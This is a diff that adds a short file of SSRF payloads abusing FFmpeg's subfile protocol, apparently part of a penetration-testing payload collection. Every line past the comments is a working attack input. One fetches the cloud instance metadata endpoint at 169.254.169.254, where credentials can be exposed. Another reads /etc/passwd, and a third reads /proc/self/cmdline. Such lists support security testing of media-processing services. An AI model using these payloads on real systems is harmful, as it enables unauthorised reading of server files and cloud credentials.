@@ -1,0 +1,13 @@
+# FFmpeg Subfile Protocol SSRF Payloads
+# ======================================
+# The subfile protocol allows reading portions of files,
+# can be chained with other protocols for SSRF.
+
+# Read portion of remote file
+subfile,,start,0,end,1000,,http://169.254.169.254/latest/meta-data/
+
+# Read local file with offset
+subfile,,start,0,end,4096,,/etc/passwd
+
+# Chain with other protocols
+subfile,,start,0,end,10000,,file:///proc/self/cmdline
